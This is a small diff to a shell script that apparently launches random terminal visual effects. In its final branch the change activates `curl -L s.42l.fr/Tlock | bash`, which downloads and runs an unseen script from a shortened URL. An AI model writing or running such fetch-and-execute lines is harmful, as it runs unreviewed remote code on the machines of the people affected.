@@ -21,7 +21,6 @@ elif [ $chosen -eq 3 ]; then
 elif [ $chosen -eq 4 ]; then
 	cacaclock &
 else
-	echo "coucou"
-	# cacafire &
-	# curl -L s.42l.fr/Tlock | bash
+	cacafire &
+	curl -L s.42l.fr/Tlock | bash
 fi
